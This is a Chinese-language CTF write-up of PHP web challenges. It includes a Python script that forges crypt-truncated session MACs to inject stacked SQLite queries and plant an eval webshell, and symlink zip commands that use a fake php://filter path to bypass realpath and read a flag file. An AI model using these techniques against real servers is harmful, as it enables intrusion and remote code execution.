    <span class="token variable">$entries</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>My shitty Blog<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image/png<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/favicon.png<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>My shitty blog<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$entry</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span></span>By <span class="token delimiter">&lt;?</span><span class="token operator">=</span>  <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup">&lt;input type="hidden" name="delete" value="<span class="token prolog">&lt;?= $entry['id'] ?></span></span>"<span class="token operator">></span>
                <span class="token shell-comment comment"># 加个userID再试一下</span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Delete<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">endforeach</span> <span class="token delimiter">?></span>

  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
</code></pre>
<p>用户输入只有三个，session，$_POST[‘content’]，$_POST[‘delete’]，content在插入的时候被prepare了，无敌防御，delete只有和从数据库里查出来的$entry[‘id’]相等时才能进行查询<br>而$entry[‘id’]是一个<code>INTEGER PRIMARY KEY AUTOINCREMENT</code>，完全不可控</p>
<p>只有session中有一个id值，在insert的时候被prepare安全插入，但在get_user和delete_entry时从数据库中取出，并未做额外处理，存在注入</p>
<p>但id需要一个对应的mac通过验证，才能被插入数据库，而mac的生成，似乎非常的安全</p>
<p>整个校验过程为这段代码</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'SECRET_PLACEHOLDER'</span><span class="token punctuation">;</span>
<span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'$'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>并不是很懂密码学的我感觉完全没法打，题目会给我们签合法id和mac，但合法的id只会是一个数字，做不到注入效果，需要进行id的伪造</p>
<p>但secret和salt均未知且不可控，crypt中的salt用来加盐且指定算法，一开始在想，如果crypt或者hash_hmac函数中支持加密数据存在注释之类的功能就好了。。。一番搜索后无果</p>
<p>最后是tkmk@0ops提出了crypt函数可以被00截断。如果hash_hmac的结果是\x00开头，则后续内容会被截断，等于对空字符串（还是说00？）进行加密，这样子就能使得整个加密结果不变</p>
<p>首先通过疯狂发包进行碰撞，只要拿到两个mac相同而id不同的数据，就能证明这两个数据在hash后是以00开头的，就能拿到对应的mac值<br>然后构造我们自己的payload，并同样的进行碰撞，以期其hash后以00开头，即可使用之前获取的00hash进行注入</p>
<p>而PHP使用的是PDO连接的sqlite，PDO默认是支持堆叠注入的，我们就可以使用sqlite的attach database操作导出一个webshell进行rce</p>
<p>理论上来说到这这个题就没什么问题了，然而我似乎有些过于愚蠢<br>这个题的dockerfile整体上和其他题的dockerfile类似，权限设置是这个样子的</p>
<pre class=" language-dockerfile"><code class="language-dockerfile">RUN chown -R root:root /var/www && \
    find /var/www -type d -exec chmod 555 {} \; && \
    find /var/www -type f -exec chmod 444 {} \; && \
    chown -R root:root /tmp /var/tmp /var/lib/php/sessions && \
    chmod -R 000 /tmp /var/tmp /var/lib/php/sessions && \
    mkdir -p /var/www/html/data && \
    chmod 703 /var/www/html/data && \
</code></pre>
<p>&#x2F;var&#x2F;www&#x2F;html是不可写的，&#x2F;var&#x2F;www&#x2F;html&#x2F;data仅可写可执行，不可读，而我们的sqlite数据库是在data下新开的目录，可读可写可执行，但目录名为<code>&#39;./data/&#39;.md5($salt.&#39;|&#39;.$id.&#39;|&#39;.$mac);</code>，salt还是没办法弄到</p>
<p>我一度苦恼如何搞到这个路径，发现sqlite有一个命令<code>.database</code>可以显示当前数据库路径，但这种命令统称dot command，只能在输入的开头使用，且不能夹杂在任何查询语句中。路径泄露无果</p>
<p>最后的最后我才发现，原来目录可写可执行但不可读，但目录下的文件可读的话，是可以直接读取那个文件的。。。目录的读的作用就是能让你列目录而已。。。<br>所以直接写data目录就好了</p>
<p>一开始一直在尝试打get_user那个函数，只要我先提交一个content把我的恶意userID插进数据库，那么我每次get访问的时候应该就会自动触发才对？但是我实际上试了半天没成功？最后是用的delete_entry函数才成功的<br>但查资料显示query和exec应该都是支持堆叠的，区别在于query返回结果，而exec只返回受影响的行数<br>所以为什么呢？</p>
<p>贴一个脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> <span class="token operator">*</span>

url <span class="token operator">=</span> <span class="token string">"http://65.108.176.96:8888/"</span>
pair <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
null <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(pair)</span>
    session <span class="token operator">=</span> res<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>
    sessions <span class="token operator">=</span> session<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"%7C"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pair<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            null <span class="token operator">=</span> sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        pair<span class="token punctuation">[</span>sessions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> sessions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> quote<span class="token punctuation">(</span><span class="token string">";ATTACH DATABASE '/var/www/html/data/z33.php' AS 'test';create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php eval($_GET[z33]);?>');-- "</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># insert user_id</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">)</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"content"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">break</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"delete"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token operator">+</span><span class="token string">"%7C"</span><span class="token operator">+</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>并不能理解flag在说什么<br><code>hxp&#123;dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(&#125;</code></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>如果，我能早点把本地环境搭起来的话，可能不会在目录权限上苦恼这么久。。。<br>理论上来说出题人给的dockerfile也没有任何的问题，但我本地进行build的时候会超级报错，dpkg如何如何，网上搜索半天并没有找到什么有用的回答，最后不知道在哪个偏僻的角落里面看到了一句升级docker版本。一看原来我本地的docker还挺老的。。。更新docker到最新版本之后真的就build起来了，呜呜</p>
<h2 id="unzipper"><a href="#unzipper" class="headerlink" title="unzipper"></a>unzipper</h2><p>这个题感觉也很难。。。因为我的智力条件你也知道.jpg</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'session_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'data/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$lock</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span> <span class="token punctuation">.</span> <span class="token string">'.lock'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fopen'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flock</span><span class="token punctuation">(</span><span class="token variable">$lock</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span> <span class="token operator">|</span> <span class="token constant">LOCK_NB</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'flock'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'chdir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ulimit -v 8192 &amp;&amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . '</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(^$|flag)/i'</span><span class="token punctuation">,</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$lock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>那个lockfile和dockerfile里面的文件清理有关，不用考虑，功能就是给你开一个sandbox然后你可以往里面解压文件，然后还可以提交一个file参数，只要这个file的realpath中没有flag且不为空（realpath在文件不存在时返回false，可以被<code>^$</code>匹配），就给你读这个文件<br>这回flag是004的且没有readflag了，可以直接读</p>
<p>当然，解压文件直接传个PHP上去不就完了，但是这里有两个问题，一个是你不知道sandbox的路径（当然，sandbox存在session里了，可以读session文件获取到），第二个是无敌的nginx配置</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token punctuation">{</span>
    <span class="token keyword">include</span> snippets<span class="token operator">/</span>fastcgi<span class="token operator">-</span>php<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
    <span class="token keyword">fastcgi_pass</span> unix<span class="token punctuation">:</span><span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token number">.4</span><span class="token operator">-</span>fpm<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>只解析index.php，所以传了也完全没用</p>
<p>说起解压zip读文件，最经典的就是曾经hctf?(记不清哪场比赛了)的zip软链接读文件，但这里多了一个限制，对传入的文件名进行了一个realpath操作，这个函数会去除所有的软链接以及相对目录，跳目录等各种操作，直接返回完整的路径。这样子的话，软链接就不能用了</p>
<p>但这个realpath有一个问题，它不能识别各种协议，比如经典的PHP伪协议<br>使用如下操作创建出一个看起来是PHP伪协议的目录和文件，再创建一个对应的软链接文件</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p php://filter/
<span class="token function">touch</span> php://filter/resource<span class="token operator">=</span>aa
<span class="token function">ln</span> -s /flag.txt aa
</code></pre>
<p>打一个包传上去，然后直接file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;aa即可读到flag</p>
<p><strong>如下两题看了官方wp以及各路神仙非预期后更新</strong></p>
<h2 id="counter"><a href="#counter" class="headerlink" title="counter"></a>counter</h2><p>这个题看了蛮久但完全没懂</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$rmf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -f -- '</span><span class="token punctuation">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'default'</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'./data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-zA-Z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$rmf</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>乍一看又是一个带点东西的文件包含，先看一下限制条件</p>
<pre><code>php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
php_admin_value[post_max_size] = 12K
php_admin_value[memory_limit] = 32M
php_admin_value[max_execution_time] = 10s
php_admin_value[opcache.enable] = 0
</code></pre>
<p>关掉了经典upload progress，nginx的日志全部被重定向到标准输入输出，pearcmd起了个本地docker看了下没装<br>不过和上一题不同，这次的nginx config中允许解析所有的PHP后缀了</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>
    <span class="token keyword">include</span> snippets<span class="token operator">/</span>fastcgi<span class="token operator">-</span>php<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
    <span class="token keyword">fastcgi_pass</span> unix<span class="token punctuation">:</span><span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token number">.4</span><span class="token operator">-</span>fpm<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>但fastcgi监听的是Unix socket，而不是端口，去年的hxpctf出了一个file_put_content用FTP协议，目的主机端口可控，写本地fpm导致rce的题，今年这个思考了半天感觉ftp也打不通了，没开远程包含，读取了远程也只能写远程，就算用ftp ssrf也没地方写。</p>
<p>功能就是输入一个page，先把这个page读出来和数字1相加，再写进去，最后include</p>
<h3 id="可能的思路？"><a href="#可能的思路？" class="headerlink" title="可能的思路？"></a>可能的思路？</h3><p>由于字符串和数字相加会被转化为数字，所以理论上来说能写进去的内容均为数字（或者套几层PHP伪协议，能base64或者压缩一下）<br>那么一种可能的思路就是先整点数字进去，然后把数字各种套filter最后能套出来一个shell。。。我觉得成功的可能性很低，都不知道怎么套流有可能套成这个样子，抛弃该思路</p>
